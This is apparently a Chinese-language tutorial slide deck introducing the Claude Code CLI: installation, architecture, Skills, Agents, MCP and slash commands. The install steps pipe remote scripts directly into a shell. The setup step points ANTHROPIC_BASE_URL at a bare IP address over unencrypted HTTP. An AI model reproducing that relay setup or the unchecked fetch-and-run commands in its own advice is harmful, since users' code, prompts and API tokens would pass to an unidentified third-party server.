# Claude Code 概览

## 什么是 Claude Code？

**Claude Code 是 Vibe Coding 的主要工具平台**

- 🖥️ **官方 CLI 工具**：与 Claude AI 深度集成

---

## 30 秒内开始使用

**前置条件：**
- 获取 Claude AI API Key

---

### 安装 Claude Code

**macOS, Linux, WSL:**

```bash
curl -fsSL https://claude.ai/install.sh | bash
或者
brew install --cask claude-code
```

--

**Windows PowerShell:**

```powershell
irm https://claude.ai/install.ps1 | iex
```

--

**Windows CMD:**

```cmd
curl -fsSL https://claude.ai/install.cmd -o install.cmd && install.cmd && del install.cmd
```

Native 安装会自动在后台更新，保持最新版本。

---

### 开始使用 Claude Code

```bash
cd your-project

export ANTHROPIC_BASE_URL="http://45.63.77.238:3000/api"
export ANTHROPIC_AUTH_TOKEN="apiKey"

claude
```

**就这么简单！**

现在，让我们深入了解 Claude Code 的强大功能...       


---

## Claude Code 架构

```
┌─────────────────────────────────┐
│      User Prompts & Intent      │
└──────────────┬──────────────────┘
               │
       ┌───────▼────────┐
       │   CLI Frontend  │
       │  (Commands &    │
       │   Interactions) │
       └───────┬────────┘
               │
   ┌───────────┼────────────┐
   │           │            │
┌──▼───┐  ┌────▼───┐  ┌─────▼──┐
│Skills│  │ Agents │  │   MCP  │
└──┬───┘  └───┬────┘  └──────┬─┘
   │          │              │
   └────┬─────┴──────┬───────┘
        │            │
   ┌────▼────────────▼────┐
   │  Claude AI Backend   │
   │  (claude-haiku-4.5)  │
   └───────┬──────────────┘
           │
    ┌──────▼──────────┐
    │ Code Repository │
    │   + Git + Bash  │
    └─────────────────┘
```

---

## 三大核心能力预览

<div class="workflow-step">
<div class="workflow-step-number">1</div>
<div class="workflow-step-content">
<p class="workflow-step-title">Skills</p>
<p class="workflow-step-desc">即开即用的专业工作流（/commit, /review-pr, /xlsx, /pdf）</p>
</div>
</div>

<div class="workflow-step">
<div class="workflow-step-number">2</div>
<div class="workflow-step-content">
<p class="workflow-step-title">Agents</p>
<p class="workflow-step-desc">自主化的探索和规划（Explore, Plan, General Purpose）</p>
</div>
</div>

<div class="workflow-step">
<div class="workflow-step-number">3</div>
<div class="workflow-step-content">
<p class="workflow-step-title">MCP 协议</p>
<p class="workflow-step-desc">连接任何工具和 API 到 Claude Code</p>
</div>
</div>

---
## 基本命令

**/init**  - 初始化 Claude Code 环境    
**/model**  - 设置使用的模型    
**/plan**  - 生成执行计划    
**/status**  - 查看当前状态    
**/clear**  - 清除缓存    
**/compact**  - 压缩存储    
**/skills**  - 查看已安装技能    
**/mcp**  - 查看 MCP 协议    
**/review**  - 代码审查    

---

## 接下来的深度讲解

我们将详细探讨 Claude Code 的**三大核心能力**：

1. **Skills** - 专业工作流自动化
2. **Agents** - 自主化能力和规划
3. **MCP** - 无限扩展性

准备好了吗？👇


